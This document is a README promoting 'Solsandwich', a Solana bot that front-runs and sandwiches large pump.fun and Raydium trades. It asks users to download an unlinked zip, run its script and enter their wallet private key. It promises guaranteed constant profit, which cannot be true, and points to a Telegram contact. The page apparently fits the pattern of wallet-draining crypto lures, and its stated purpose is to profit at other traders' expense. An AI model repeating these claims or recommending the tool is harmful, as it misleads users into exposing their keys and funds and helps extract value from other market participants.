<p align="center">
    <img src="https://github.com/solsandwicher/Solsandwich-solana-frontrun-sandwich-bot/blob/main/image.png?raw=true">
</p>

<b>Solsandwich is a Bot</b> that listens to new pump.fun and raydium token transactions and frontruns big txs on tokens for a fixed amount in SOL, guaranteeing a constant profit on each transaction you send.
Depending on the speed of the RPC node, the TX ALWAYS happens before the frontran tx is sent.

<p align="center">
  <a href="">Download</a>
</p>

<p align="center">
  <a href="https://t.me/solsandwicher">Telegram</a>
</p>


- `Sandwich high txs`
- `Auto-Sell in same block`
- `TP/SL`
- `Priority fee`
- `0.0001 Ms delay`
- `Fast Buy`
- `Jito bundles`
- `Bundle txs`

> [!NOTE]
> This is provided as is, for learning purposes.

[![TypeScript](https://badgen.net/badge/icon/python)](https://python.org)
![UPTime](https://camo.githubusercontent.com/4a67ad96d71cca235a4393b2f3b79aabb0a3d42d555030632f1110e9eedde567/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f757074696d652d3130302532352d627269676874677265656e)

## 👾 SETUP
To run the script you need to:
1. Download and extract the zip file
2. Run from your cmd:
`pip install -r requirements.txt`
3. Launch the frontrun:
`py main.py`

## 🚀 CONFIG
Configure the script by updating `Settings` Tab.
`ACCOUNT_ADDRESS` -> raydium liquidity pool address
`PRIVATE_KEY` -> wallet private key
`SOLANA_RPC_URL` -> solana mainnet rpc
`QUICKNODE_RPC_URL` -> quicknode mainnet rpc
`SOLANA_WS_URL` -> solana mainnet websocket
`QUICKNODE_WS_URL` -> quicknode websocket rpc
  
## 🚀 COMMON ISSUES

> [!IMPORTANT]
> If you have an error which is not listed here, please create a new issue in this repository.
> 
> ### EMPTY TRANSACTION
> If you see empty transactions on SolScan most likely fix is to change commitment level to `finalized`.
> 
> ### UNSOPPORTED RPC NODE
> If you see following error in your log file:  
> `Error: 410 Gone:  {"jsonrpc":"2.0","error":{"code": 410, "message":"The RPC call or parameters have been disabled."}, "id": "986f3599-b2b7-47c4-b951-074c19842bad" }`  
> It means your RPC node doesn't support methods needed to execute script.
> FIX: Change your RPC node. You can use Shyft, Helius or Quicknode.

## 🛸 CONTACT
Telegram: `https://t.me/solsandwicher`

## 🛰 Disclaimer
Use this script at your own risk. 

